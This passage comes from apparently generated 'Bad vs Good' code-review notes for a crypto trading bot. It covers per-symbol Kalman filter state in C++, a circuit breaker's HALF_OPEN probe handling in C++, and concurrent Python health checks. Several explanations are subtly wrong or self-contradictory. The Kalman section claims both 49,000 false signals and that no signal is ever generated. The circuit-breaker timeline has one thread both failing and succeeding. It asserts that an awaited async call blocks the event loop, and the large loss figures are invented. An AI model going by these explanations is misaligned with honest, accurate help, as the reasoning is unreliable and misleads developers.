    uint64_t price_count_{0}; // SINGLE price count
};

// In bot_loop.cpp:
for (const auto& [symbol, sym_cstr, sym_id] : ctx.symbol_entries) {
    double price = get_current_price(sym_cstr);
    auto sig = mean_rev.on_price(now_ns, price);
    // Iteration 1: BTC at $100,000
    //   kalman_.reset(100000)
    //   residuals_[0] = 0.0 (price == fair_price)
    //   write_idx_ = 1
    //
    // Iteration 2: ETH at $3,500
    //   kalman_ was tracking BTC at $100,000
    //   fair_price = kalman_.update(3500) → Kalman thinks price dropped 96.5%
    //   residual = 3500 - ~96500 = ~-93000 (MASSIVE residual)
    //   z-score = -93000 / sigma → off the charts
    //   Signal: ENTER_LONG (z < -entry_threshold)
    //   But this is WRONG — ETH didn't diverge from its fair value
    //   The Kalman filter is contaminated with BTC data
    //
    // Iteration 3: SOL at $200
    //   kalman_ now confused by BTC + ETH mix
    //   fair_price = some garbage value
    //   residual = meaningless
    //   Signal: STOP (|z| > 4.0) — false stop
    //
    // Result: ALL symbols after the first get garbage signals
    // The Kalman filter, residuals, and OU parameters are all contaminated
    // With 50 symbols: 49 symbols get incorrect signals
    // With 1000 users × 50 symbols: 49,000 incorrect signals per cycle
    // If each incorrect signal causes a $10 loss (wrong direction, false stop):
    // $490,000 per cycle, $29.4M per hour
}
```

**What's wrong:**
- Single `KalmanFilter1D` tracks all symbols — BTC at $100K, then ETH at $3.5K, then SOL at $200
- The Kalman filter's state estimate (`x_`) is contaminated — it tries to smooth across $100K → $3.5K → $200
- Residuals buffer mixes BTC residuals with ETH residuals — OU parameter estimation is meaningless
- Z-score is calculated from contaminated residuals — false ENTER_LONG, false STOP signals
- `write_idx_` is shared — BTC writes to indices 0-499, ETH overwrites at 500-999, SOL at 1000-1499
- With 50 symbols, each symbol only gets 2048/50 ≈ 40 data points in the ring buffer — below `min_samples=100`
- No signal is ever generated because `n < min_samples` is always true after the ring buffer wraps
- With 1000 users × 50 symbols: 49,000 incorrect signals per cycle, $29.4M/hour in losses

### ✅ Good Code
```cpp
class MeanReversionV2 {
  public:
    struct PerSymbolState {
        KalmanFilter1D kalman;
        alignas(64) std::array<double, 2048> residuals{};
        alignas(64) std::array<uint64_t, 2048> timestamps{};
        uint64_t write_idx{0};
        uint64_t price_count{0};
        double last_kappa{0.0};
        double last_theta{0.0};
        double last_sigma{0.0};
        double last_z{0.0};
    };

    Signal on_price(const char* symbol, uint64_t timestamp_ns, double price) noexcept {
        PerSymbolState& state = get_or_create_state(symbol);
        // Each symbol has its OWN Kalman filter, residuals, timestamps
        // BTC's Kalman tracks BTC fair price
        // ETH's Kalman tracks ETH fair price
        // No cross-contamination

        if (state.price_count == 0) {
            state.kalman.reset(price);
        }
        double fair_price = state.kalman.update(price);
        ++state.price_count;

        double residual = price - fair_price;
        state.residuals[state.write_idx % config_.ou_window] = residual;
        state.timestamps[state.write_idx % config_.ou_window] = timestamp_ns;
        ++state.write_idx;

        // OU estimation uses ONLY this symbol's residuals
        // Z-score is calculated from this symbol's OU parameters
        // Signals are correct for this symbol
        // ...
    }

  private:
    std::unordered_map<std::string, PerSymbolState, StringHash, std::equal_to<>> states_;

    PerSymbolState& get_or_create_state(const char* symbol) noexcept {
        auto it = states_.find(std::string_view(symbol));
        if (it == states_.end()) {
            it = states_.emplace(std::string(symbol), PerSymbolState{}).first;
        }
        return it->second;
    }
};

// In bot_loop.cpp:
for (const auto& [symbol, sym_cstr, sym_id] : ctx.symbol_entries) {
    double price = get_current_price(sym_cstr);
    auto sig = mean_rev.on_price(sym_cstr, now_ns, price);
    // Iteration 1: BTC — state.kalman tracks BTC, residuals are BTC-only
    // Iteration 2: ETH — DIFFERENT state.kalman tracks ETH, residuals are ETH-only
    // Iteration 3: SOL — DIFFERENT state.kalman tracks SOL, residuals are SOL-only
    // Each symbol has its own independent Kalman filter and OU parameters
    // Z-scores are correct for each symbol
    // No cross-contamination
}
```

**Разница:** The bad code uses a single `KalmanFilter1D`, single residuals array, and single write_idx for all symbols. When BTC at $100K is followed by ETH at $3.5K, the Kalman filter tries to smooth across the $96.5K price drop — the state estimate becomes garbage. Residuals from BTC, ETH, and SOL are mixed in the same ring buffer — OU parameter estimation is meaningless. Z-scores are calculated from contaminated data, producing false ENTER_LONG and false STOP signals. With 50 symbols, each symbol only gets ~40 data points in the ring buffer (2048/50), below the `min_samples=100` threshold — no signals are ever generated after the buffer wraps. With 1000 users × 50 symbols, 49,000 incorrect signals per cycle, $29.4M/hour in losses. The good code introduces a `PerSymbolState` struct containing its own Kalman filter, residuals array, timestamps, and write_idx. Each symbol gets its own independent state — BTC's Kalman tracks BTC's fair price, ETH's Kalman tracks ETH's fair price. No cross-contamination. Z-scores are correct for each symbol. The cost is a `PerSymbolState` struct (~32KB per symbol) and an `unordered_map` lookup per call. The benefit is correct signals for all 50 symbols — no false entries, no false stops, no $29.4M/hour in losses. This is a classic example of a missing per-instance state bug: the developer designed the algorithm for a single symbol but forgot to isolate state when extending to multiple symbols.

---

## Bad vs Good: CircuitBreaker HALF_OPEN Allows Multiple Probes (C++)

### ❌ Bad Code
```cpp
class CircuitBreaker {
  public:
    bool allow_request() noexcept {
        State s = state_.load(std::memory_order_relaxed);
        if (s == State::CLOSED) return true;
        if (s == State::OPEN) {
            // ... check cooldown, transition to HALF_OPEN ...
            state_.store(State::HALF_OPEN, std::memory_order_relaxed);
            return true; // Allow probe
        }
        // HALF_OPEN: allow one probe
        return true;  // ← BUG: allows ALL threads to probe simultaneously
    }

    void record_success() noexcept {
        error_count_.store(0, std::memory_order_relaxed);
        state_.store(State::CLOSED, std::memory_order_relaxed);
    }

    void record_failure() noexcept {
        int count = error_count_.fetch_add(1, std::memory_order_relaxed) + 1;
        if (count >= threshold_) {
            state_.store(State::OPEN, std::memory_order_relaxed);
            // ... store opened_at_ns_ ...
        }
    }
};

// Scenario with 10 threads and a failing downstream service:
// t=0: Circuit is OPEN (5 failures, 30s cooldown)
// t=30s: Thread 1 calls allow_request() → transitions to HALF_OPEN → returns true
// t=30s: Thread 2 calls allow_request() → state is HALF_OPEN → returns true
// t=30s: Thread 3 calls allow_request() → state is HALF_OPEN → returns true
// ...
// t=30s: Thread 10 calls allow_request() → state is HALF_OPEN → returns true
//
// All 10 threads send requests to the failing service simultaneously.
// This is a "thundering herd" — 10× the load on an already-failing service.
//
// t=30.1s: All 10 requests fail.
// Thread 1: record_failure() → error_count = 1 → not >= 5 → state stays HALF_OPEN
// Thread 2: record_failure() → error_count = 2 → not >= 5 → state stays HALF_OPEN
// ...
// Thread 5: record_failure() → error_count = 5 → >= 5 → state = OPEN
// Thread 6: record_failure() → error_count = 6 → state already OPEN
// ...
// Thread 10: record_failure() → error_count = 10 → state already OPEN
//
// But wait — Thread 1's request actually succeeded (service was recovering)!
// Thread 1: record_success() → error_count = 0, state = CLOSED
// Thread 2: record_failure() → error_count = 1 → state stays CLOSED
//
// Result: Circuit is CLOSED but the service is still failing!
// 9 threads got failures but 1 success closed the circuit.
// Now all traffic flows to the failing service again.
//
// With 1000 users × 10 threads each:
// - 10,000 simultaneous probes to a failing service
// - Service goes from "partially failing" to "completely overwhelmed"
// - Recovery takes 10× longer because of the probe storm
// - If the service is a payment gateway: 10,000 failed payment attempts
// - Each failed attempt may trigger a retry → 20,000+ requests
// - Payment gateway may block the IP for abuse
// - All 1000 users lose payment capability for hours
```

**What's wrong:**
- HALF_OPEN state allows ALL threads to probe simultaneously — "thundering herd"
- 10 threads = 10 simultaneous requests to an already-failing service
- `record_success()` from one thread closes the circuit while other probes are in flight
- `record_failure()` from other threads increments error_count but state may already be CLOSED
- Race condition: success + failure = inconsistent state
- With 1000 users × 10 threads: 10,000 simultaneous probes, service overwhelmed, recovery 10× slower
- If the service is a payment gateway: 10,000 failed payments, IP blocked, all users lose payments for hours

### ✅ Good Code
```cpp
class CircuitBreaker {
  public:
    bool allow_request() noexcept {
        State s = state_.load(std::memory_order_acquire);
        if (s == State::CLOSED) return true;
        if (s == State::OPEN) {
            // Check cooldown
            auto now = std::chrono::steady_clock::now();
            int64_t opened_ns = opened_at_ns_.load(std::memory_order_acquire);
            auto opened = std::chrono::steady_clock::time_point(
                std::chrono::nanoseconds(opened_ns));
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                now - opened).count();
            if (elapsed >= cooldown_seconds_) {
                // Try to transition to HALF_OPEN — only ONE thread succeeds
                State expected = State::OPEN;
                if (state_.compare_exchange_strong(
                        expected, State::HALF_OPEN,
                        std::memory_order_acq_rel)) {
                    probe_in_flight_.store(true, std::memory_order_release);
                    return true; // This thread is the probe
                }
                // Another thread already transitioned — fall through
            }
            return false;
        }
        // HALF_OPEN: only allow if no probe is in flight
        if (probe_in_flight_.load(std::memory_order_acquire)) {
            return false;  // Another thread is already probing
        }
        // Try to become the probe
        bool expected = false;
        return probe_in_flight_.compare_exchange_strong(
            expected, true, std::memory_order_acq_rel);
    }

    void record_success() noexcept {
        error_count_.store(0, std::memory_order_release);
        probe_in_flight_.store(false, std::memory_order_release);
        state_.store(State::CLOSED, std::memory_order_release);
    }

    void record_failure() noexcept {
        probe_in_flight_.store(false, std::memory_order_release);
        int count = error_count_.fetch_add(1, std::memory_order_acq_rel) + 1;
        if (count >= threshold_) {
            state_.store(State::OPEN, std::memory_order_release);
            opened_at_ns_.store(
                std::chrono::duration_cast<std::chrono::nanoseconds>(
                    std::chrono::steady_clock::now().time_since_epoch()).count(),
                std::memory_order_release);
        }
    }

  private:
    std::atomic<bool> probe_in_flight_{false};  // Only ONE probe at a time
};

// Scenario with 10 threads and a failing downstream service:
// t=0: Circuit is OPEN (5 failures, 30s cooldown)
// t=30s: Thread 1 calls allow_request() → CAS OPEN→HALF_OPEN succeeds
//        → probe_in_flight_ = true → returns true (Thread 1 is the probe)
// t=30s: Thread 2 calls allow_request() → state is HALF_OPEN
//        → probe_in_flight_ is true → returns false (denied)
// t=30s: Thread 3-10: same as Thread 2 → all denied
//
// Only Thread 1 sends a request to the downstream service.
//
// t=30.1s: Thread 1's request fails.
// Thread 1: record_failure() → probe_in_flight_ = false, error_count = 1
//           → not >= 5 → state stays HALF_OPEN
//
// t=30.2s: Thread 2 calls allow_request() → state is HALF_OPEN
//          → probe_in_flight_ is false → CAS succeeds → Thread 2 is the probe
//
// t=30.3s: Thread 2's request fails.
// Thread 2: record_failure() → probe_in_flight_ = false, error_count = 2
//
// ... continues until error_count reaches 5 → state = OPEN
//
// OR: Thread 3's request succeeds!
// Thread 3: record_success() → probe_in_flight_ = false, error_count = 0
//           → state = CLOSED
// Now all traffic flows normally — the service has recovered.
//
// Result: Only 1 probe at a time. No thundering herd.
// Service recovers gradually, not overwhelmed by probe storm.
// With 1000 users × 10 threads: max 1 probe per user at a time
// = 1000 probes max, not 10,000. 10× less load on failing service.
```

**Разница:** The bad code allows ALL threads to probe simultaneously in HALF_OPEN state. With 10 threads, 10 simultaneous requests hit an already-failing service — a "thundering herd" that overwhelms the service and delays recovery by 10×. Worse, if one probe succeeds while others fail, `record_success()` closes the circuit while failures are still in flight — the circuit is CLOSED but the service is still failing. All traffic resumes to the failing service. With 1000 users × 10 threads, 10,000 simultaneous probes to a payment gateway could get the IP blocked, losing payment capability for all users for hours. The good code uses a `probe_in_flight_` atomic flag with CAS — only ONE thread can be the probe at a time. Other threads are denied in HALF_OPEN state. The probe either succeeds (circuit closes, traffic resumes) or fails (error count increments, eventually re-opens circuit). No thundering herd, no race condition, no inconsistent state. The cost is one `atomic<bool>` and one CAS per `allow_request()` in HALF_OPEN — negligible. The benefit is 10× less load on failing services, gradual recovery, and no false CLOSE from race conditions. This is a classic example of a missing concurrency guard: the developer wrote "allow one probe" in the comment but the code allows unlimited probes — the comment was correct but the implementation didn't match.

---

## Bad vs Good: Sequential Health Checks Cause K8s Probe Timeout (Python)

### ❌ Bad Code
```python
class HealthChecker:
    async def check_readiness(self) -> dict[str, Any]:
        components: list[ComponentHealth] = []
        components.append(await self._check_ws())       # 0.5s (fast)
        components.append(await self._check_db())       # 30s (DB is down, timeout)
        components.append(await self._check_redis())    # 0.3s (fast, but waits 30s)
        components.append(await self._check_exchange()) # 0.2s (fast, but waits 30.3s)
        # Total: 0.5 + 30 + 0.3 + 0.2 = 31s
        #
        # Kubernetes readiness probe:
        #   timeoutSeconds: 1 (default)
        #   periodSeconds: 10
        #   failureThreshold: 3
        #
        # t=0:    K8s sends GET /health/ready
        # t=0.5:  WS check done (0.5s)
        # t=0.5:  DB check starts...
        # t=1:    K8s probe times out (1s). Pod marked NOT READY.
        # t=30.5: DB check finally times out (30s)
        # t=30.8: Redis check done (0.3s)
        # t=31:   Exchange check done (0.2s)
        # t=31:   Response sent — but K8s already gave up at t=1
        #
        # Meanwhile, the coroutine is still running for 31s:
        # - It holds the event loop for 30s during DB check
        # - Other coroutines (signal processing, order execution) are blocked
        # - The entire bot is frozen for 30s
        # - Signals are not processed, orders are not sent
        # - With 1000 users: 1000 bots frozen for 30s
        # - If BTC drops 5% during those 30s: no stop-loss triggered
        # - 1000 users × $10K positions × 5% = $500K in unprevented losses
        # - And K8s marks all 1000 pods as NOT READY, removing them from the load balancer
        # - All 1000 users lose service for 30s+ (until probe succeeds)
        return {
            "status": overall.value,
            "components": [...],
        }

    async def _check_db(self) -> ComponentHealth:
        start = time.time()
        try:
            if not self.db_client:
                return ComponentHealth("timescaledb", HealthStatus.HEALTHY, 0, "not configured")
            health = await self.db_client.get_health()  # ← No timeout! Hangs 30s
            # ...
        except (OSError, RuntimeError, KeyError, ValueError) as e:
            return ComponentHealth("timescaledb", HealthStatus.UNHEALTHY, 0, str(e))
```

**What's wrong:**
- 4 health checks run sequentially — total time = sum of all timeouts
- DB down (30s) blocks Redis and Exchange checks that would take 0.3s + 0.2s
- K8s readiness probe times out at 1s, marks pod NOT READY, removes from load balancer
- The coroutine holds the event loop for 30s — signal processing and order execution are blocked
- No timeout on individual checks — `await self.db_client.get_health()` hangs indefinitely
- With 1000 users: 1000 bots frozen for 30s, $500K in unprevented losses (5% BTC drop × $10K positions)
- K8s removes all 1000 pods from load balancer — all users lose service

### ✅ Good Code
```python
import asyncio

class HealthChecker:
    async def check_readiness(self) -> dict[str, Any]:
        # Run all 4 checks CONCURRENTLY — total time = max(timeout) not sum(timeout)
        results = await asyncio.gather(
            self._check_ws(),
            self._check_db(),
            self._check_redis(),
            self._check_exchange(),
            return_exceptions=True,  # Don't let one failure cancel others
        )
        components = []
        for r in results:
            if isinstance(r, Exception):
                components.append(ComponentHealth("unknown", HealthStatus.UNHEALTHY, 0, str(r)))
            else:
                components.append(r)
        # Total: max(0.5, 2.0, 0.3, 0.2) = 2.0s (DB check has 2s timeout)
        #
        # t=0:    K8s sends GET /health/ready
        # t=0:    All 4 checks start simultaneously
        # t=0.2:  Exchange check done
        # t=0.3:  Redis check done
        # t=0.5:  WS check done
        # t=2.0:  DB check times out (2s timeout) → UNHEALTHY
        # t=2.0:  Response sent: "degraded" (DB unhealthy, others healthy)
        #
        # K8s probe:
        #   If timeoutSeconds: 3 → probe succeeds (2s < 3s)
        #   Pod stays READY, stays in load balancer
        #   Only DB is marked unhealthy — other services continue
        #
        # Event loop is only blocked for 2s, not 30s
        # Signal processing and order execution resume after 2s
        # With 1000 users: 1000 bots frozen for 2s, not 30s
        # If BTC drops 5% during those 2s: minimal impact (2s vs 30s)
        # 1000 users × $10K × 5% × (2/30) = $33K vs $500K — 15× less losses
        # ...

    async def _check_db(self) -> ComponentHealth:
        start = time.time()
        try:
            if not self.db_client:
                return ComponentHealth("timescaledb", HealthStatus.HEALTHY, 0, "not configured")
            # Timeout: 2 seconds max — don't hang indefinitely
            health = await asyncio.wait_for(
                self.db_client.get_health(),
                timeout=2.0,
            )
            latency = (time.time() - start) * 1000
            if health.get("connected"):
                return ComponentHealth("timescaledb", HealthStatus.HEALTHY, latency, health.get("database", ""))
            else:
                return ComponentHealth("timescaledb", HealthStatus.UNHEALTHY, latency, health.get("error", "not connected"))
        except asyncio.TimeoutError:
            latency = (time.time() - start) * 1000
            return ComponentHealth("timescaledb", HealthStatus.UNHEALTHY, latency, "timeout (2s)")
        except (OSError, RuntimeError, KeyError, ValueError) as e:
            return ComponentHealth("timescaledb", HealthStatus.UNHEALTHY, 0, str(e))
```

**Разница:** The bad code runs 4 health checks sequentially — total time = 0.5 + 30 + 0.3 + 0.2 = 31s. When the database is down, the DB check hangs for 30s with no timeout, blocking the event loop. Redis and Exchange checks (which would take 0.3s and 0.2s) wait 30s before even starting. The K8s readiness probe times out at 1s, marks the pod as NOT READY, and removes it from the load balancer. The coroutine continues running for 31s, holding the event loop — signal processing and order execution are frozen. With 1000 users, 1000 bots are frozen for 30s. If BTC drops 5% during those 30s, no stop-loss is triggered — $500K in unprevented losses. All 1000 pods are removed from the load balancer, all users lose service. The good code uses `asyncio.gather()` to run all 4 checks concurrently — total time = max(0.5, 2.0, 0.3, 0.2) = 2.0s. Each check has a 2s timeout via `asyncio.wait_for()`. The DB check fails fast (2s) instead of hanging (30s). The event loop is only blocked for 2s, not 30s. The K8s probe succeeds (2s < 3s timeout), the pod stays READY, and only the DB is marked unhealthy. With 1000 users, bots are frozen for 2s, not 30s — 15× less losses ($33K vs $500K). The cost is `asyncio.gather()` + `asyncio.wait_for()` — 2 lines of code. The benefit is 15× faster health checks, 15× less losses during DB outages, and no false NOT READY from K8s. This is a classic example of sequential vs concurrent I/O: the developer treated async I/O as if it were synchronous, running checks one after another instead of in parallel. In a microservices architecture with 1000 users, this difference is $467K per DB outage.
